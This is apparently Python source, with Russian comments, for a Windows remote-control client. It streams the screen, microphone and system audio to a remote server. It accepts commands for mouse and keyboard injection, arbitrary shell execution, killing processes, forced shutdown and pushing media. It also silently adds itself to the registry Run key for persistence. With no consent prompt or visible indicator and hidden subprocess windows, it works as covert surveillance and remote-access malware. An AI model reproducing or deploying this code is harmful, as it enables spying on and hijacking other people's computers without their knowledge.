import sys
import socket
import json
import struct
import time
import ctypes
import queue
import array
import threading
import os
import base64
import tempfile
import subprocess
import winreg as reg
from io import BytesIO
import ctypes.wintypes as wt

# DPI awareness — до tkinter
try:
    ctypes.windll.shcore.SetProcessDpiAwareness(2)
except Exception:
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass

import tkinter as tk

import mss
from PIL import Image, ImageDraw, ImageTk, ImageSequence
import sounddevice as sd

try:
    import pyaudiowpatch as pyaudio
    HAS_PYAUDIO = True
except ImportError:
    pyaudio = None
    HAS_PYAUDIO = False

try:
    from playsound import playsound
    HAS_PLAYSOUND = True
except ImportError:
    playsound = None
    HAS_PLAYSOUND = False

# ================= НАСТРОЙКИ =================
SERVER_HOST = "" # Айпи сервер
VIDEO_PORT = 11 # Видео порт
AUDIO_PORT = 22 # Аудио порт
ACTION_PORT = 33 # Порт для действий

CLIENT_ID = "CLIENT1" # Номер токена
CLIENT_TOKEN = "client1" # Токен

SAMPLE_RATE = 16000
CHANNELS = 1
BLOCK_MS = 40
BLOCK_SAMPLES = SAMPLE_RATE * BLOCK_MS // 1000
MAX_AUDIO_PACKET = 256 * 1024

TARGET_FPS = 60
MAX_FRAME_SIZE = 8 * 1024 * 1024
MAX_WIDTH = 1920
MAX_HEIGHT = 1080
JPEG_QUALITY = 75
FRAME_DELAY = 1.0 / TARGET_FPS

MAX_ACTION_PACKET = 96 * 1024 * 1024

IMAGE_EXT = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".tif", ".tiff"}
VIDEO_EXT = {".mp4", ".avi", ".mkv", ".mov", ".webm", ".wmv", ".flv", ".m4v"}


# ================= WINAPI =================
USER32 = ctypes.windll.user32


class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]


def get_cursor_pos():
    pt = POINT()
    USER32.GetCursorPos(ctypes.byref(pt))
    return pt.x, pt.y


MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_MIDDLEDOWN = 0x0020
MOUSEEVENTF_MIDDLEUP = 0x0040
MOUSEEVENTF_WHEEL = 0x0800
KEYEVENTF_KEYUP = 0x0002
KEYEVENTF_EXTENDEDKEY = 0x0001

_EXTENDED_VK = {
    0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
    0x2C, 0x2D, 0x2E,
    0x5B, 0x5C, 0x5D,
    0x6F, 0x90, 0xA3, 0xA5,
}

last_frame_size = [0, 0]


def make_packet(packet_type: int, payload: bytes) -> bytes:
    return bytes([packet_type]) + struct.pack("!I", len(payload)) + payload


def recv_exact(sock, count):
    data = bytearray()
    while len(data) < count:
        chunk = sock.recv(count - len(data))
        if not chunk:
            return None
        data.extend(chunk)
    return bytes(data)


# ================= INPUT =================
def _get_screen_size():
    try:
        return (USER32.GetSystemMetrics(0), USER32.GetSystemMetrics(1))
    except Exception:
        return (0, 0)


def _map_coords(x, y):
    fw, fh = last_frame_size
    if fw <= 0 or fh <= 0:
        return int(x), int(y)
    sw, sh = _get_screen_size()
    if sw <= 0 or sh <= 0:
        return int(x), int(y)
    return int(x * sw / fw), int(y * sh / fh)


def _do_mouse_move(x, y):
    try:
        USER32.SetCursorPos(int(x), int(y))
    except Exception as e:
        print(f"[Actions] mouse_move failed: {e}")


def _do_mouse_click(x, y, button, pressed):
    try:
        USER32.SetCursorPos(int(x), int(y))
        if button == "left":
            flag = MOUSEEVENTF_LEFTDOWN if pressed else MOUSEEVENTF_LEFTUP
        elif button == "right":
            flag = MOUSEEVENTF_RIGHTDOWN if pressed else MOUSEEVENTF_RIGHTUP
        elif button == "middle":
            flag = MOUSEEVENTF_MIDDLEDOWN if pressed else MOUSEEVENTF_MIDDLEUP
        else:
            return
        USER32.mouse_event(flag, 0, 0, 0, 0)
    except Exception as e:
        print(f"[Actions] mouse_click failed: {e}")


def _do_mouse_wheel(delta):
    try:
        USER32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, int(delta), 0)
    except Exception as e:
        print(f"[Actions] mouse_wheel failed: {e}")


def _do_key(vk, pressed):
    vk = int(vk)
    if vk <= 0:
        return
    try:
        flags = 0
        if vk in _EXTENDED_VK:
            flags |= KEYEVENTF_EXTENDEDKEY
        if not pressed:
            flags |= KEYEVENTF_KEYUP
        USER32.keybd_event(vk, 0, flags, 0)
    except Exception as e:
        print(f"[Actions] key failed: {e}")


# ================= AUDIO =================
mic_queue = queue.Queue(maxsize=50)
sys_queue = queue.Queue(maxsize=50)
mic_muted = threading.Event()
system_muted = threading.Event()


def mic_callback(indata, frames, timing, status):
    try:
        mic_queue.put_nowait(bytes(indata))
    except queue.Full:
        pass


def system_callback_sd(indata, frames, timing, status):
    try:
        sys_queue.put_nowait(bytes(indata))
    except queue.Full:
        pass


def _downmix_mono(data, channels):
    if channels <= 1:
        return bytes(data)
    arr = array.array("h", data)
    frames = len(arr) // channels
    out = array.array("h", [0] * frames)
    for i in range(frames):
        s = 0
        for c in range(channels):
            s += arr[i * channels + c]
        out[i] = s // channels
    return out.tobytes()


def _resample(data_mono, src_rate):
    if src_rate == SAMPLE_RATE:
        return data_mono
    arr = array.array("h", data_mono)
    n_in = len(arr)
    if n_in == 0:
        return b""
    n_out = int(n_in * SAMPLE_RATE / src_rate)
    if n_out <= 0:
        return b""
    ratio = src_rate / SAMPLE_RATE
    out = array.array("h", [0] * n_out)
    for i in range(n_out):
        start = int(i * ratio)
        end = int((i + 1) * ratio)
        if end > n_in:
            end = n_in
        if end <= start:
            end = start + 1
        s = 0
        for j in range(start, end):
            s += arr[j]
        out[i] = s // (end - start)
    return out.tobytes()


def _mix_int16(mic, sys_blk):
    if not mic and not sys_blk:
        return b""
    if not mic:
        return sys_blk
    if not sys_blk:
        return mic
    a = array.array("h", mic)
    b = array.array("h", sys_blk)
    n = max(len(a), len(b))
    out = array.array("h", [0] * n)
    for i in range(n):
        v = (a[i] if i < len(a) else 0) + (b[i] if i < len(b) else 0)
        if v > 32767:
            v = 32767
        elif v < -32768:
            v = -32768
        out[i] = v
    return out.tobytes()


def _open_loopback_pyaudio():
    if not HAS_PYAUDIO:
        return None, None, 0, 0
    pa = None
    try:
        pa = pyaudio.PyAudio()
        try:
            wasapi_info = pa.get_host_api_info_by_type(pyaudio.paWASAPI)
        except OSError:
            pa.terminate()
            return None, None, 0, 0
        try:
            default_speakers = pa.get_device_info_by_index(wasapi_info["defaultOutputDevice"])
        except Exception:
            pa.terminate()
            return None, None, 0, 0
        loopback = None
        for i in range(pa.get_device_count()):
            info = pa.get_device_info_by_index(i)
            if not info.get("isLoopbackDevice", False):
                continue
            if info["name"].startswith(default_speakers["name"]):
                loopback = info
                break
        if loopback is None:
            for i in range(pa.get_device_count()):
                info = pa.get_device_info_by_index(i)
                if info.get("isLoopbackDevice", False):
                    loopback = info
                    break
        if loopback is None:
            pa.terminate()
            return None, None, 0, 0

        rate = int(loopback["defaultSampleRate"])
        ch = int(loopback["maxInputChannels"])
        block = max(1, int(rate * BLOCK_MS / 1000))

        def cb(in_data, frame_count, time_info, status):
            try:
                sys_queue.put_nowait(in_data)
            except queue.Full:
                pass
            return (None, pyaudio.paContinue)

        stream = pa.open(
            format=pyaudio.paInt16, channels=ch, rate=rate, input=True,
            input_device_index=loopback["index"],
            frames_per_buffer=block, stream_callback=cb,
        )
        stream.start_stream()
        print(f"[Audio] system loopback OK (pyaudiowpatch): {loopback['name']} {rate}Hz {ch}ch")
        return stream, pa, rate, ch
    except Exception as e:
        print(f"[Audio] pyaudiowpatch failed: {e}")
        if pa is not None:
            try:
                pa.terminate()
            except Exception:
                pass
        return None, None, 0, 0


def _open_loopback_sounddevice():
    try:
        hostapis = sd.query_hostapis()
        wasapi_idx = None
        for i, api in enumerate(hostapis):
            if "WASAPI" in str(api.get("name", "")):
                wasapi_idx = i
                break
        if wasapi_idx is None:
            return None, 0, 0
        dev_idx = hostapis[wasapi_idx].get("default_output_device", -1)
        if dev_idx < 0:
            return None, 0, 0
        dev_info = sd.query_devices(dev_idx)
        native_rate = int(dev_info.get("default_samplerate", 48000))
        max_ch = int(dev_info.get("max_output_channels", 2))
        try:
            settings = sd.WasapiSettings(loopback=True)
        except TypeError:
            print("[Audio] sounddevice too old for loopback")
            return None, 0, 0
        for ch in (2, 1):
            if ch > max_ch:
                continue
            try:
                block = int(native_rate * BLOCK_MS / 1000) * ch
                stream = sd.RawInputStream(
                    samplerate=native_rate, channels=ch, dtype="int16",
                    blocksize=block, device=dev_idx,
                    extra_settings=settings, callback=system_callback_sd,
                )
                stream.start()
                print(f"[Audio] system loopback OK (sounddevice): "
                      f"{dev_info['name']} {native_rate}Hz {ch}ch")
                return stream, native_rate, ch
            except Exception as e:
                print(f"[Audio] sounddevice loopback {ch}ch failed: {e}")
    except Exception as e:
        print(f"[Audio] sounddevice loopback error: {e}")
    return None, 0, 0


def send_audio_stream_loop():
    while True:
        sock = None
        mic_stream = None
        sys_stream = None
        sys_pa = None
        sys_rate = 0
        sys_ch = 0
        sys_is_pyaudio = False
        try:
            sock = socket.create_connection((SERVER_HOST, AUDIO_PORT), timeout=10)
            sock.settimeout(10)
            sock.sendall(json.dumps({"role": "clients", "token": CLIENT_TOKEN}).encode() + b"\n")
            buf = bytearray()
            while b"\n" not in buf:
                part = sock.recv(1)
                if not part:
                    raise ConnectionError("closed during handshake")
                buf.extend(part)
                if len(buf) > 2048:
                    raise RuntimeError("bad response")
            if not json.loads(buf.decode().strip()).get("ok"):
                raise RuntimeError("auth rejected")
            sock.settimeout(None)

            try:
                mic_stream = sd.RawInputStream(
                    samplerate=SAMPLE_RATE, channels=CHANNELS, dtype="int16",
                    blocksize=BLOCK_SAMPLES, callback=mic_callback,
                )
                mic_stream.start()
            except Exception as e:
                print(f"[Audio] mic failed: {e}")
                mic_stream = None

            if HAS_PYAUDIO:
                sys_stream, sys_pa, sys_rate, sys_ch = _open_loopback_pyaudio()
                sys_is_pyaudio = sys_stream is not None
            if sys_stream is None:
                sys_stream, sys_rate, sys_ch = _open_loopback_sounddevice()
                sys_is_pyaudio = False

            if sys_stream is None:
                print("[Audio] system audio OFF — mic only")
            if mic_stream is None and sys_stream is None:
                raise RuntimeError("no audio sources available")

            while not mic_queue.empty():
                mic_queue.get_nowait()
            while not sys_queue.empty():
                sys_queue.get_nowait()

            while True:
                mic = None
                sys_blk = None
                got_data = False

                if mic_stream is not None:
                    try:
                        raw_mic = mic_queue.get(timeout=0.05)
                        got_data = True
                        if not mic_muted.is_set():
                            mic = raw_mic
                    except queue.Empty:
                        pass

                if sys_stream is not None:
                    try:
                        raw = sys_queue.get_nowait()
                        got_data = True
                        if not system_muted.is_set():
                            sys_blk = _resample(_downmix_mono(raw, sys_ch), sys_rate)
                    except queue.Empty:
                        pass

                if not got_data and mic_stream is None and sys_stream is not None:
                    try:
                        raw = sys_queue.get(timeout=0.05)
                        got_data = True
                        if not system_muted.is_set():
                            sys_blk = _resample(_downmix_mono(raw, sys_ch), sys_rate)
                    except queue.Empty:
                        pass

                if mic is None and sys_blk is None:
                    if got_data:
                        silent = bytes(BLOCK_SAMPLES * CHANNELS * 2)
                        sock.sendall(struct.pack("!I", len(silent)) + silent)
                    continue

                out = _mix_int16(mic or b"", sys_blk or b"")
                if out and len(out) <= MAX_AUDIO_PACKET:
                    sock.sendall(struct.pack("!I", len(out)) + out)
        except Exception as exc:
            print(f"[Audio Error]: {exc}. Переподключение через 5 секунд...")
        finally:
            if mic_stream is not None:
                try:
                    mic_stream.stop()
                except Exception:
                    pass
                try:
                    mic_stream.close()
                except Exception:
                    pass
            if sys_is_pyaudio and sys_stream is not None:
                try:
                    sys_stream.stop_stream()
                except Exception:
                    pass
                try:
                    sys_stream.close()
                except Exception:
                    pass
                if sys_pa is not None:
                    try:
                        sys_pa.terminate()
                    except Exception:
                        pass
            elif sys_stream is not None:
                try:
                    sys_stream.stop()
                except Exception:
                    pass
                try:
                    sys_stream.close()
                except Exception:
                    pass
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
        time.sleep(5)


# ================= VIDEO =================
def send_screen_stream_loop():
    sct = mss.MSS()
    arrow_points = [(0, 0), (0, 17), (4, 13), (7, 19), (9, 18), (6, 12), (11, 12)]

    while True:
        sock = None
        try:
            sock = socket.create_connection((SERVER_HOST, VIDEO_PORT), timeout=10)
            sock.settimeout(10)
            sock.sendall(json.dumps({"role": "clients", "token": CLIENT_TOKEN}).encode() + b"\n")
            buf = bytearray()
            while b"\n" not in buf:
                part = sock.recv(1)
                if not part:
                    raise ConnectionError("closed during handshake")
                buf.extend(part)
                if len(buf) > 2048:
                    raise RuntimeError("bad response")
            if not json.loads(buf.decode().strip()).get("ok"):
                raise RuntimeError("auth rejected")
            sock.settimeout(None)

            while True:
                start_time = time.time()
                monitor = sct.monitors[1]
                shot = sct.grab(monitor)
                image = Image.frombytes("RGB", shot.size, shot.rgb)

                gx, gy = get_cursor_pos()
                cx, cy = gx - monitor["left"], gy - monitor["top"]
                if 0 <= cx <= monitor["width"] and 0 <= cy <= monitor["height"]:
                    pts = [(x + cx, y + cy) for x, y in arrow_points]
                    ImageDraw.Draw(image).polygon(pts, fill="white", outline="black")

                image.thumbnail((MAX_WIDTH, MAX_HEIGHT))
                last_frame_size[0] = image.width
                last_frame_size[1] = image.height

                buffer = BytesIO()
                image.save(buffer, format="JPEG", quality=JPEG_QUALITY, optimize=True)
                jpeg = buffer.getvalue()
                if len(jpeg) > MAX_FRAME_SIZE:
                    buffer = BytesIO()
                    image.save(buffer, format="JPEG", quality=55, optimize=True)
                    jpeg = buffer.getvalue()

                cid = CLIENT_ID.encode("utf-8")
                sock.sendall(make_packet(2, bytes([len(cid)]) + cid + jpeg))

                dt = FRAME_DELAY - (time.time() - start_time)
                if dt > 0:
                    time.sleep(dt)
        except Exception as exc:
            print(f"[Video Error]: {exc}. Переподключение через 5 секунд...")
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
            time.sleep(5)


# ================= ACTIONS: звук =================
def _play_beep():
    try:
        import winsound
        winsound.Beep(880, 500)
    except Exception as e:
        print(f"[Actions] beep failed: {e}")


def _play_mp3(data_b64):
    if not HAS_PLAYSOUND:
        print("[Actions] playsound not installed — pip install playsound==1.2.2")
        return
    path = None
    try:
        raw = base64.b64decode(data_b64)
        fd, path = tempfile.mkstemp(suffix=".mp3")
        os.close(fd)
        with open(path, "wb") as fp:
            fp.write(raw)
        playsound(path)
    except Exception as e:
        print(f"[Actions] playsound failed: {e}")
    finally:
        if path:
            try:
                os.remove(path)
            except OSError:
                pass


# ================= ACTIONS: машина =================
def _do_restart():
    try:
        subprocess.Popen(
            ["shutdown", "/r", "/t", "0", "/f"],
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        print("[Actions] shutdown /r issued")
    except Exception as e:
        print(f"[Actions] restart failed: {e}")


def _do_shutdown():
    try:
        subprocess.Popen(
            ["shutdown", "/s", "/t", "0", "/f"],
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        print("[Actions] shutdown /s issued")
    except Exception as e:
        print(f"[Actions] shutdown failed: {e}")


# ================= ACTIONS: процессы =================
def _list_processes():
    procs = []
    try:
        out = subprocess.check_output(
            ["tasklist", "/FO", "CSV", "/NH"],
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
            encoding="cp866", errors="ignore",
            timeout=10,
        )
        for line in out.splitlines():
            line = line.strip()
            if not line or not line.startswith('"'):
                continue
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) < 5:
                continue
            name = parts[0]
            try:
                pid = int(parts[1])
            except ValueError:
                continue
            mem = parts[4].replace("\xa0", "").replace(" ", "")
            procs.append({"name": name, "pid": pid, "mem": mem})
    except Exception as e:
        print(f"[Actions] tasklist failed: {e}")
    return procs


def _kill_process(name_or_pid):
    try:
        s = str(name_or_pid).strip()
        if not s:
            return
        if s.isdigit():
            args = ["taskkill", "/F", "/PID", s]
        else:
            args = ["taskkill", "/F", "/IM", s]
        subprocess.Popen(
            args,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        print(f"[Actions] taskkill issued: {s}")
    except Exception as e:
        print(f"[Actions] taskkill failed: {e}")


def _run_process(name):
    try:
        s = str(name).strip()
        if not s:
            return
        subprocess.Popen(
            s,
            shell=True,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        print(f"[Actions] run_process: {s}")
    except Exception as e:
        print(f"[Actions] run_process failed: {e}")


# ================= ACTIONS: медиа =================
_tk_queue = queue.Queue()
_tk_thread_started = [False]
_tk_ready = threading.Event()
_media_root = [None]

VLC_CANDIDATES = [
    r"C:\Program Files\VideoLAN\VLC\vlc.exe",
    r"C:\Program Files (x86)\VideoLAN\VLC\vlc.exe",
]


def _find_vlc():
    for p in VLC_CANDIDATES:
        if os.path.isfile(p):
            return p
    return None


def _tk_loop():
    root = tk.Tk()
    root.withdraw()
    try:
        root.tk.call("tk", "scaling", 1.0)
    except Exception:
        pass
    _media_root[0] = root
    _tk_ready.set()

    def _poll():
        try:
            while True:
                fn = _tk_queue.get_nowait()
                try:
                    fn()
                except Exception as e:
                    print(f"[Media] tk task failed: {e}")
        except queue.Empty:
            pass
        root.after(50, _poll)

    root.after(50, _poll)
    root.mainloop()


def _ensure_tk_thread():
    if _tk_thread_started[0]:
        return
    _tk_thread_started[0] = True
    threading.Thread(target=_tk_loop, daemon=True).start()
    if not _tk_ready.wait(timeout=5.0):
        print("[Media] WARNING: Tk init timeout")


def _fit_fullscreen(img, sw, sh):
    if img.width <= 0 or img.height <= 0:
        return img
    ratio = min(sw / img.width, sh / img.height)
    new_w = max(1, int(img.width * ratio))
    new_h = max(1, int(img.height * ratio))
    if new_w == img.width and new_h == img.height:
        return img
    return img.resize((new_w, new_h), Image.LANCZOS)


def _open_image_toplevel(path, fullscreen):
    img = Image.open(path)

    win = tk.Toplevel(_media_root[0])
    win.title(os.path.basename(path))
    win.configure(bg="black")

    sw = win.winfo_screenwidth()
    sh = win.winfo_screenheight()

    label = tk.Label(win, bg="black")
    label.pack(expand=True, fill="both")

    if getattr(img, "is_animated", False):
        frames = []
        durations = []
        for frame in ImageSequence.Iterator(img):
            f = frame.convert("RGB")
            if fullscreen:
                f = _fit_fullscreen(f, sw, sh)
            frames.append(ImageTk.PhotoImage(f))
            durations.append(max(20, int(frame.info.get("duration", 100))))
        if not frames:
            raise RuntimeError("no frames")

        def animate(i=0):
            if not win.winfo_exists():
                return
            try:
                label.configure(image=frames[i])
                win.after(durations[i], animate, (i + 1) % len(frames))
            except Exception:
                pass

        animate()
    else:
        display = _fit_fullscreen(img, sw, sh) if fullscreen else img
        photo = ImageTk.PhotoImage(display)
        label.configure(image=photo)
        label.image = photo

    win.bind("<Escape>", lambda e: win.destroy())
    win.deiconify()
    win.update_idletasks()

    if fullscreen:
        try:
            win.attributes("-fullscreen", True)
            win.update_idletasks()
            win.lift()
            win.focus_force()
        except Exception as e:
            print(f"[Media] -fullscreen attribute failed: {e}")

        def _verify():
            if not win.winfo_exists():
                return
            try:
                w = win.winfo_width()
                h = win.winfo_height()
                if w < sw - 20 or h < sh - 20:
                    win.overrideredirect(True)
                    win.geometry(f"{sw}x{sh}+0+0")
                    win.lift()
            except Exception:
                pass

        win.after(500, _verify)

    print(f"[Media] show image: {os.path.basename(path)} fullscreen={fullscreen}")


def _show_image_window(path, fullscreen):
    _ensure_tk_thread()
    _tk_queue.put(lambda: _open_image_toplevel(path, fullscreen))


def _send_fullscreen_keys():
    time.sleep(1.5)
    try:
        USER32.keybd_event(0x7A, 0, 0, 0)
        time.sleep(0.05)
        USER32.keybd_event(0x7A, 0, KEYEVENTF_KEYUP, 0)
        time.sleep(0.4)
    except Exception:
        pass
    try:
        USER32.keybd_event(0x12, 0, 0, 0)
        time.sleep(0.03)
        USER32.keybd_event(0x0D, 0, 0, 0)
        time.sleep(0.03)
        USER32.keybd_event(0x0D, 0, KEYEVENTF_KEYUP, 0)
        time.sleep(0.03)
        USER32.keybd_event(0x12, 0, KEYEVENTF_KEYUP, 0)
    except Exception:
        pass


def _show_video(path, fullscreen):
    vlc = _find_vlc()
    print(f"[Media] video: {os.path.basename(path)} fullscreen={fullscreen} vlc={vlc}")
    if vlc:
        try:
            args = [vlc]
            if fullscreen:
                args.append("--fullscreen")
            args.append(path)
            subprocess.Popen(args)
            print(f"[Media] video via VLC fullscreen={fullscreen}")
            return
        except Exception as e:
            print(f"[Media] vlc failed: {e}")

    try:
        os.startfile(path)
    except Exception as e:
        print(f"[Media] startfile failed: {e}")
        return
    print(f"[Media] show video via default player fullscreen={fullscreen}")
    if fullscreen:
        threading.Thread(target=_send_fullscreen_keys, daemon=True).start()


def _handle_open_media(cmd):
    data = cmd.get("data")
    ext = (cmd.get("ext") or "").lower()
    fullscreen = bool(cmd.get("fullscreen"))
    if not data:
        print("[Media] empty payload")
        return
    try:
        raw = base64.b64decode(data)
    except Exception as e:
        print(f"[Media] decode failed: {e}")
        return

    fd, path = tempfile.mkstemp(suffix=ext or ".bin")
    os.close(fd)
    try:
        with open(path, "wb") as fp:
            fp.write(raw)
    except OSError as e:
        print(f"[Media] write failed: {e}")
        return

    print(f"[Media] received: {cmd.get('value')} ext={ext} fullscreen={fullscreen}")

    if ext in IMAGE_EXT:
        _show_image_window(path, fullscreen)
    elif ext in VIDEO_EXT:
        _show_video(path, fullscreen)
    else:
        try:
            os.startfile(path)
        except Exception as e:
            print(f"[Media] unknown ext: {e}")


# ================= ACTIONS LOOP =================
def actions_loop():
    while True:
        sock = None
        try:
            sock = socket.create_connection((SERVER_HOST, ACTION_PORT), timeout=10)
            sock.settimeout(10)
            sock.sendall(json.dumps({"role": "clients", "token": CLIENT_TOKEN}).encode() + b"\n")
            buf = bytearray()
            while b"\n" not in buf:
                part = sock.recv(1)
                if not part:
                    raise ConnectionError("closed during handshake")
                buf.extend(part)
                if len(buf) > 2048:
                    raise RuntimeError("bad response")
            if not json.loads(buf.decode().strip()).get("ok"):
                raise RuntimeError("auth rejected")
            sock.settimeout(None)
            print("[Actions] connected")

            while True:
                header = recv_exact(sock, 4)
                if header is None:
                    break
                size = struct.unpack("!I", header)[0]
                if size <= 0 or size > MAX_ACTION_PACKET:
                    continue
                payload = recv_exact(sock, size)
                if payload is None:
                    break
                try:
                    cmd = json.loads(payload.decode("utf-8"))
                except Exception:
                    continue

                action = cmd.get("action")
                value = cmd.get("value")

                if action == "mute_mic":
                    if value:
                        mic_muted.set()
                        print("[Actions] mic muted")
                    else:
                        mic_muted.clear()
                        print("[Actions] mic unmuted")
                elif action == "mute_system":
                    if value:
                        system_muted.set()
                        print("[Actions] system audio muted")
                    else:
                        system_muted.clear()
                        print("[Actions] system audio unmuted")
                elif action == "reproduce_sound":
                    threading.Thread(target=_play_beep, daemon=True).start()
                    print("[Actions] beep command")
                elif action == "play_sound":
                    data = cmd.get("data")
                    if data:
                        threading.Thread(target=_play_mp3, args=(data,), daemon=True).start()
                        print(f"[Actions] play_sound: {value}")
                elif action == "open_media":
                    threading.Thread(
                        target=_handle_open_media, args=(cmd,), daemon=True
                    ).start()
                    print(f"[Actions] open_media: {value} fullscreen={cmd.get('fullscreen')}")
                elif action == "mouse_move":
                    rx, ry = _map_coords(cmd.get("x", 0), cmd.get("y", 0))
                    _do_mouse_move(rx, ry)
                elif action == "mouse_click":
                    rx, ry = _map_coords(cmd.get("x", 0), cmd.get("y", 0))
                    _do_mouse_click(rx, ry, cmd.get("button"), cmd.get("pressed"))
                elif action == "mouse_wheel":
                    _do_mouse_wheel(cmd.get("delta", 0))
                elif action == "key":
                    _do_key(cmd.get("vk", 0), cmd.get("pressed", False))
                elif action == "machine_restart":
                    print("[Actions] machine_restart")
                    threading.Thread(target=_do_restart, daemon=True).start()
                elif action == "machine_shutdown":
                    print("[Actions] machine_shutdown")
                    threading.Thread(target=_do_shutdown, daemon=True).start()
                elif action == "list_processes":
                    req_id = cmd.get("request_id")
                    procs = _list_processes()
                    resp = json.dumps({
                        "action": "process_list_response",
                        "request_id": req_id,
                        "processes": procs,
                    }).encode("utf-8")
                    try:
                        sock.sendall(struct.pack("!I", len(resp)) + resp)
                    except OSError:
                        pass
                    print(f"[Actions] list_processes: {len(procs)} items sent")
                elif action == "kill_process":
                    _kill_process(value)
                elif action == "run_process":
                    _run_process(value)
        except Exception as exc:
            print(f"[Actions Error]: {exc}")
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
        time.sleep(5)

# ================= STARTUP =================
def add_to_startup():
    file_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
    try:
        key = reg.OpenKey(
            reg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, reg.KEY_SET_VALUE,
        )
        reg.SetValueEx(key, "Client.exe", 0, reg.REG_SZ, file_path)
        reg.CloseKey()
    except Exception:
        pass


# ================= ТОЧКА ВХОДА =================
if __name__ == "__main__":
    add_to_startup()
    threading.Thread(target=send_screen_stream_loop, daemon=True).start()
    threading.Thread(target=send_audio_stream_loop, daemon=True).start()
    threading.Thread(target=actions_loop, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)
